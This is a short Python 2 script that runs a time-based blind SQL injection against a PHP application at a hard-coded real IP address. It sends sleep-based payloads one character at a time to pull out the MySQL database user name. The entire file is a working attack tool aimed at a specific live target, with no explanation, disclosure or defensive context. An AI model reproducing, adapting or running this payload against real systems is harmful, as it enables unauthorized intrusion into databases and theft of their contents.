#!/usr/bin/env python
# encoding:utf-8
import time
import requests

payloads = '0123456789abcdefghijklmnopqrstuvwxyz@_-.'
url = 'http://202.120.163.39/index.php?app=Home&g=Index&m=Index&a=index&wa=3&cat_id=43&id='
user = ''

for num in xrange(1,11):
    for p in payloads:
        s = "if(now()=sysdate(),sleep(if(ascii(mid(user(),{0},1))={1},8,0)),0)".format(num,ord(p))
        start_time = time.time()
        r = requests.get(url+s)
        if time.time() - start_time > 8.0:
            user += p
            print user
            break

print "[+] MySQL User is {0}".format(user)
